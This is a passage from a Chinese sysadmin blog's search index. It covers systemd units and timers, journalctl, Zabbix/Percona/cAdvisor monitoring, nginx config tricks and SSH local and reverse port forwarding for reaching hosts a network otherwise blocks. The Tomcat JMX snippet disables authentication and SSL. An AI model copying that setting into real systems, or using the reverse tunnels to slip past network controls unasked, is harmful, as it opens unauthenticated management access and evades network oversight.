","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:1:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"2. [Service] Service区块定义如何启动当前服务。 注意：[Service]部分的启动、重启、停止命令全部要求使用绝对路径，使用相对路径则会报错！ Environment=指定当前服务运行的环境参数,该值使用key=value健值对 ;Environment=LANG=C EnvironmentFile=指定当前服务的环境参数文件。该文件内部的key=value键值对，可以用$key的形式，在当前配置文件中获取。 Type=字段定义服务启动类型 ;Type=simple(默认值): ExecStart字段启动的进程为主进程 ;Type=exec: 类似于simple，simple表示当fork()函数返回时，即表示启动完成，而exec则表示仅在fork()和execve()函数都执行成功时，才算启动完成. ;Type=forking：ExecStart字段将以fork()方式启动，此时父进程将会退出，子进程将成为主进程 ;Type=oneshot：类似于simple，但只执行一次，Systemd 会等它执行完，才启动其他服务 ;Type=dbus：类似于simple，但会等待 D-Bus 信号后启动 ;Type=notify：类似于simple，启动结束后会发出通知信号，然后 Systemd 再启动其他服务 ;Type=idle：类似于simple，但是要等到其他任务都执行完，才会启动该服务。一种使用场合是为让该服务的输出，不与其他服务的输出相混合 TimeoutStopSec=停止服务时的等待的秒数，如果超过这个时间服务仍然没有停止，systemd 会使用 SIGKILL 信号强行杀死服务的进程。 TimeoutStartSec=启动服务时的等待的秒数，如果超过这个时间服务任然没有执行完所有的启动命令，则 systemd 会认为服务自动失败。 ExecStart=启动服务时执行的命令 ExecReload=重启服务时执行的命令 ExecStop=停止服务时执行的命令 ExecStartPre=启动服务之前执行的命令 ExecStartPost=启动服务之后执行的命令 ExecStopPost=停止服务之后执行的命令 User=指定运行服务的用户，会影响服务对本地文件系统的访问权限。 Group=指定运行服务的用户组，会影响服务对本地文件系统的访问权限。 RootDirectory=指定服务进程的根目录（默认: / ），如果配置了这个参数后，服务将无法访问指定目录以外的任何文件。 Nice=服务的进程优先级，值越小优先级越高，默认为0。-20为最高优先级，19为最低优先级 KillMode=表示systemd如何停止当前定义服务 ;KillMode=control-group（默认值）：当前控制组里面的所有子进程，都会被杀掉 ;KillMode=process：只杀主进程 ;KillMode=mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号 ;KillMode=none：没有进程会被杀掉，只是执行服务的 stop 命令。 Restart=定义了当前定义服务退出后，Systemd的重启方式。 ;Restart=no（默认值）：退出后不会重启 ;Restart=on-success：只有正常退出时（退出状态码为0），才会重启 ;Restart=on-failure：非正常退出时（退出状态码非0），包括被信号终止和超时，才会重启 ;Restart=on-abnormal：只有被信号终止和超时，才会重启 ;Restart=on-abort：只有在收到没有捕捉到的信号终止时，才会重启 ;Restart=on-watchdog：超时退出，才会重启 ;Restart=always：不管是什么退出原因，总是重启 RestartSec=12s 表示 Systemd 重启服务之前，需要等待的秒数。 ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:2:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"3. [Install] Install区块，定义如何安装这个配置文件，即怎样做到开机启动。 WantedBy=表示该服务所在的Target ; Target的含义是服务组，表示一组服务,一般来说，常用的 Target 有两个：一个是multi-user.target，表示多用户命令行状态；另一个是graphical.target，表示图形用户状态，它依赖于multi-user.target ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:3:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"4. systemd 的定时任务(.timer) 所谓定时任务，就是未来的某个或多个时点，预定要执行的任务，比如每五分钟收一次邮件、每天半夜两点分析一下日志等等。 Linux 系统通常都使用 cron 设置定时任务，但是 Systemd 也有这个功能，而且优点显著 自动生成日志，配合 Systemd 的日志工具，很方便除错 可以设置内存和 CPU 的使用额度，比如最多使用50%的 CPU 任务可以拆分，依赖其他 Systemd 单元，完成非常复杂的任务 每个单元都有一个单元描述文件，它们分散在三个目录。 /lib/systemd/system：系统默认的单元文件 /etc/systemd/system：用户安装的软件的单元文件 /usr/lib/systemd/system：用户自己定义的单元文件 systemd 定时任务分为两个部分 任务执行部分.service 用于定义如何执行该任务,无需配置如何安装(即定义Install) 定时执行部分.timer 用于定义什么时间执行该任务 [Timer] 节点 ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:4:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"5. systemd 常用相关命令 ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:5:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"5.1. systemctl 系统相关 # 重启系统 $\u003e sudo systemctl reboot # 关闭系统，切断电源 $\u003e sudo systemctl poweroff # CPU停止工作 $\u003e sudo systemctl halt # 暂停系统 $\u003e sudo systemctl suspend # 让系统进入冬眠状态 $\u003e sudo systemctl hibernate # 让系统进入交互式休眠状态 $\u003e sudo systemctl hybrid-sleep # 启动进入救援状态（单用户状态） $\u003e sudo systemctl rescue ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:6:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"5.2. systemd-analyze命令用于查看启动耗时 # 查看启动耗时 $\u003e systemd-analyze # 查看每个服务的启动耗时 $\u003e systemd-analyze blame # 显示瀑布状的启动过程流 $\u003e systemd-analyze critical-chain # 显示指定服务的启动流 $\u003e systemd-analyze critical-chain atd.service ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:7:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"5.3. loginctl命令用于查看当前登录的用户 # 列出当前session $\u003e loginctl list-sessions # 列出当前登录用户 $\u003e loginctl list-users # 列出显示指定用户的信息 $\u003e loginctl show-user ruanyf ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:8:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"5.4. systemctl 状态查询命令 # 显示某个 Unit 是否正在运行 $\u003e systemctl is-active application.service # 显示某个 Unit 是否处于启动失败状态 $\u003e systemctl is-failed application.service # 显示某个 Unit 服务是否建立了启动链接 $\u003e systemctl is-enabled application.service ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:9:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"5.5. 系统日志管理 # 查看所有日志（默认情况下 ，只保存本次启动的日志） $\u003e sudo journalctl # 查看内核日志（不显示应用日志） $\u003e sudo journalctl -k # 查看系统本次启动的日志 $\u003e sudo journalctl -b $\u003e sudo journalctl -b -0 # 查看上一次启动的日志（需更改设置） $\u003e sudo journalctl -b -1 # 查看指定时间的日志 $\u003e sudo journalctl --since=\"2012-10-30 18:17:16\" $\u003e sudo journalctl --since \"20 min ago\" $\u003e sudo journalctl --since yesterday $\u003e sudo journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\" $\u003e sudo journalctl --since 09:00 --until \"1 hour ago\" # 显示尾部的最新10行日志 $\u003e sudo journalctl -n # 显示尾部指定行数的日志 $\u003e sudo journalctl -n 20 # 实时滚动显示最新日志 $\u003e sudo journalctl -f # 查看指定服务的日志 $\u003e sudo journalctl /usr/lib/systemd/systemd # 查看指定进程的日志 $\u003e sudo journalctl _PID=1 # 查看某个路径的脚本的日志 $\u003e sudo journalctl /usr/bin/bash # 查看指定用户的日志 $\u003e sudo journalctl _UID=33 --since today # 查看某个 Unit 的日志 $\u003e sudo journalctl -u nginx.service $\u003e sudo journalctl -u nginx.service --since today # 实时滚动显示某个 Unit 的最新日志 $\u003e sudo journalctl -u nginx.service -f # 合并显示多个 Unit 的日志 $\u003e journalctl -u nginx.service -u php-fpm.service --since today # 查看指定优先级（及其以上级别）的日志，共有8级 # 0: emerg # 1: alert # 2: crit # 3: err # 4: warning # 5: notice # 6: info # 7: debug $\u003e sudo journalctl -p err -b # 日志默认分页输出，--no-pager 改为正常的标准输出 $\u003e sudo journalctl --no-pager # 以 JSON 格式（单行）输出 $\u003e sudo journalctl -b -u nginx.service -o json # 以 JSON 格式（多行）输出，可读性更好 $\u003e sudo journalctl -b -u nginx.service -o json-pretty # 显示日志占据的硬盘空间 $\u003e sudo journalctl --disk-usage # 指定日志文件占据的最大空间 $\u003e sudo journalctl --vacuum-size=1G # 指定日志文件保存多久 $\u003e sudo journalctl --vacuum-time=1years 对于[Timer]节点, Systemd 提供以下一些字段。 OnActiveSec：定时器生效后，多少时间开始执行任务 OnBootSec：系统启动后，多少时间开始执行任务 OnStartupSec``：Systemd 进程启动后，多少时间开始执行任务 OnUnitActiveSec：该单元上次执行后，等多少时间再次执行(s/h) 示例: OnUnitActiveSec=1h 表示一小时执行一次任务 OnUnitActiveSec=*-*-* 02:00:00表示每天凌晨两点执行 OnUnitActiveSec=Mon *-*-* 02:00:00表示每周一凌晨两点执行 官方文档 https://www.freedesktop.org/software/systemd/man/systemd.time.html OnUnitInactiveSec： 定时器上次关闭后多少时间，再次执行 OnCalendar：基于绝对时间，而不是相对时间执行 AccuracySec：如果因为各种原因，任务必须推迟执行，推迟的最大秒数，默认是60秒 Unit：真正要执行的任务，默认是同名的带有.service后缀的单元 Persistent：如果设置了该字段，即使定时器到时没有启动，也会自动执行相应的单元 WakeSystem：如果系统休眠，是否自动唤醒系统 ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:10:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","运维记事"],"content":"监控解决方案","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事"],"content":"1. tomcat 监控方案 (jmx) zabbix javaGetway zabbix_server 编译安装需增加-enable-java，yum安装的需要安装java java-devel zabbix-java-gateway Tomcat开启远程监控功能, /pathto/tomcat/bin/catalina.sh 大概97行添加CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=\u003ctomcat主机ip\u003e\" 配置，并解析\u003ctomcat主机ip\u003e tomcat 启动/pathto/zabbix/sbin/zabbix_java/startup.sh 端口: 10052 修改zabbix_server.conf配置文件，启用javaPollers,指定javaGateway地址, 217 行: JavaGateway=127.0.0.1 # ip 225 行: JavaGatewayPort=10052 # 本地的端口 235 行: StartJavaPollers=5 # 启动的进程书 zabbix 创建主机，添加jmx接口监控，添加模版JMX的Template JMX Generic/Template JMX Tomcat ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:1:0","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事"],"content":"2. mysql 监控方案 (percona + zabbix) https://www.percona.com/doc/percona-monitoring-plugins/LATEST/zabbix/index.html#installation-instructions 安装依赖包 yum install -y php php-mysql # 注意 安装php 会默认安装httpd,建议手动编译 wget 'https://www.percona.com/downloads/percona-monitoring-plugins/percona-monitoring-plugins-1.1.8/binary/redhat/7/x86_64/percona-zabbix-templates-1.1.8-1.noarch.rpm' rpm -ivh percona-zabbix-templates-1.1.8-1.noarch.rpm cp /var/lib/zabbix/percona/templates/userparameter_percona_mysql.conf /usr/local/zabbix/etc/zabbix/zabbix_agentd.d/ 修改php脚本配置 vim /var/lib/zabbix/percona/scripts/ss_get_mysql_stats.php $mysql_user = ''; $mysql_pass = ''; ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:2:0","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事"],"content":"3. docker 监控解决方案 ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:3:0","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事"],"content":"zabbix + docker https://segmentfault.com/a/1190000007568413 useradd zabbix -M -s /sbin/nologin sudo usermod -aG docker zabbix /opt/soft mkdir zabbix32 cd zabbix32 svn co svn://svn.zabbix.com/branches/3.2 . ./bootstrap.sh ./configure --enable-agent --prefix=/opt/zabbix.docker make install mkdir src/modules/zabbix_module_docker cd src/modules/zabbix_module_docker wget https://raw.githubusercontent.com/monitoringartist/Zabbix-Docker-Monitoring/master/src/modules/zabbix_module_docker/zabbix_module_docker.c wget https://raw.githubusercontent.com/monitoringartist/Zabbix-Docker-Monitoring/master/src/modules/zabbix_module_docker/Makefile make mkdir /opt/zabbix.docker/module/ cp zabbix_module_docker.so /opt/zabbix.docker/module/ # zabbix_agentd.conf LoadModulePath=/opt/zabbix.docker/module/ LoadModule=zabbix_module_docker.so ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:4:0","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事"],"content":"cAvisor+InfluxDB+Grafana ### influxdb ### [root@00 ~]# docker run -d --name influxdb --net monitor -p 8083:8083 -p 8086:8086 tutum/influxdb # 管理页面 # http://\u003cip\u003e:8083/ ## # 以下可输入命令在选择框中均有提示 # 创建cadvisor 数据库 ,在输入栏中输入:CREATE DATABASE \"cadvisor\" 然后回车 # 查看创建的数据,在输入栏中输入: SHOW DATABASES 然后回车 # 创建grafana 连接用户,在输入栏中输入: CREATE USER \"grafana\" WITH PASSWORD 'xxxxxx' 然后回车 # 查看创建的用户,在输入栏输入: SHOW USERS 然后回车， ## ### cadvisor ### [root@00 ~]# docker run -d --name=cadvisor --net monitor -p 8084:8080 -v /:/rootfs:ro -v /var/run:/var/run -v /sys:/sys:ro -v /var/lib/docker:/var/lib/docker:ro google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxdb:8086 # [root@00 ~]# docker run -d --name=cadvisor --net monitor -p 8084:8080 --mount type=bind,src=/,dst=/rootfs,ro --mount type=bind,src=/var/run,dst=/var/run --mount type=bind,src=/sys,dst=/sys,ro --mount type=bind,src=/var/lib/docker,dst=/var/lib/docker,ro google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxdb:8086 #管理页面 #http://\u003cip\u003e:8084/ ### grafana ### [root@00 ~]# docker run -d --name grafana --net monitor -p 3000:3000 grafana/grafana #管理页面 # http://\u003cip\u003e:3000/ ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:5:0","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事","整理收集"],"content":"Nginx常用骚操作","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"nginx if else 实现 set $is_matched 0; if ($http_user_agent ~* \"wget\") { set $is_matched \"${is_matched}1\"; } if ($remote_addr ~ \"127.0.0.1|172.16.11.10\") { set $is_matched \"${is_matched}01\"; } # 满足条件: # 当 http_user_agent == wget or remote_addr = ip # is_matched 值为 01 001 # 当条件为 http_user_agent == wget and remote_addr = ip # is_matched 值为 0101 if ($is_matched = \"01\"){ return 403; } ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:1","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"nginx 获取cdn ip 及 ip(段)访问限制 # http map $http_x_forwarded_for $client_real_ip { \"\" $remote_addr; # fix: 兼容ipv6 ~^(?P\u003cfirstAddr\u003e[0-9a-fA-F:.]+),?.*$ $firstAddr; } set $is_allow 0; # location,server if ( $client_real_ip ~* '^(223)\\.(193)\\.(97)\\.(.*)$' ) { set $is_allow 1; } if ($client_real_ip ~ '172.31.11.111|127.0.0.1'){ set $is_allow 1; } if ( $client_real_ip ~* \"172\\.31\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\" ) { set $is_allow 1; } # and 实现 if ( $is_allow = \"1\" ){ return 200; } return 502; ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:2","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"nginx 代理, 非根目录 到根目录 location /frps/ { proxy_pass http://$host:$server_port/; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect / /frps/; #rewrite ^/frps/(.*)$ /$1 break; } ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:3","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"Nginx发布Alias虚拟目录及PHP支持配置方法 location /owa { alias /pathto/owa; index index.php index.html index.htm; } location ~ /owa/.+.php.*$ { if ($fastcgi_script_name ~ /owa/(.+.php.*)$) { set $valid_fastcgi_script_name $1; } fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_connect_timeout 150; fastcgi_read_timeout 150; fastcgi_send_timeout 150; fastcgi_buffer_size 256k; fastcgi_buffers 16 256k; fastcgi_busy_buffers_size 512k; fastcgi_temp_file_write_size 512k; fastcgi_param SCRIPT_FILENAME /pathto/owa/$valid_fastcgi_script_name; #fastcgi_param SCRIPT_FILENAME /pathto/$fastcgi_script_name; include fastcgi_params; } ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:4","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"Nginx 任意域名匹配及root路径定位 # 这段配置的作用是 匹配任意域名，子域名(subdomain)、主域名(maindomain)、顶级域名(tld) , 子域名可有可无 # 然后根据匹配值 将root路径设置为 匹配到的值($host) ## server server_name ~^(?:(?\u003csubdomain\u003e.+)\\.)?(?\u003cmaindomain\u003e[^\\.]+)\\.(?\u003ctld\u003e.+)$; set $root_path /data/wwwroot/$host; if (!-d $root_path){ set $root_path /data/wwwroot/www.$host; } root $root_path; ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:5","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","那些有用没用的"],"content":"Ssh隧道相关，端口转发","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"1. 记录一个草稿 参考文献 : http://www.zsythink.net/archives/2450 http://codelife.me/blog/2012/12/09/three-types-of-ssh-turneling/ https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html 主机定义 : serverA: 10.0.1.11 serverB: 10.0.1.12 serverC: 172.16.110.11 serverD: 172.16.110.12 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:1:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"2. 本地转发 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:2:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"命令格式 ssh -L \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:3:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"2.1. 隧道搭建(serverA 执行) # -L 表示使用本地转发建立隧道 # -N 表示不执行远程命令 # -f 表示运行到后台 # -g 开启网关功能,serverA中的所有ip都将会被监控 # 整段意思表示 在本地(serverA)主机上建设一个到serverB的隧道,使用本地端口转发模式,监听本地(serverA)的9022端口,当访问本地(serverA)的9022端口时,会将通信数据转发到serverB的22端口 [root@00 ~]# ssh -N -f -L 9022:10.0.1.12:22 root@10.0.1.12 # ssh -N -f -L 127.0.0.1:9022:10.0.1.12:22 root@10.0.1.12 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:4:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"2.2. 隧道连接(serverA 执行) ssh root@127.0.0.1 -P9022 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:5:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"3. 远程端口转发 (内网穿透) 例如: serverB 可以连接serverC, 但serverC 不能访问serverB , serverC 和 serverD 可以相互访问,若 serverD(或serverC) 需要访问serverB的ssh服务 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:6:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"命令格式 ssh -R \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:7:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"3.1. 隧道搭建(serverB 执行) # -N 表示不执行远程命令 # -R 表示创建远程转发的ssh隧道 # serverB(10.0.1.12)上执行 ,将会在远程主机serverC(172.16.110.11)上生成隧道端口(9022)的监听 ssh -N -R 9022:10.0.1.12:22 root@172.16.110.11 # serverB(10.0.1.12)上执行 ,将会在远程主机serverC(172.16.110.11)上生成隧道端口(9023)的监听 ssh -N -R 9023:10.0.1.11:22 root@172.16.110.11 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:8:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"3.2. 隧道连接 # 在serverC(172.16.110.11) 上执行,将会登陆serverB(10.0.1.12)主机 ssh root@127.0.0.1 -P9022 # 在serverC(172.16.110.11) 上执行,将会登陆serverA(10.0.1.11)主机 ssh root@127.0.0.1 -P9023 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:9:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"4. 动态端口转发 有点类似shadowsocks 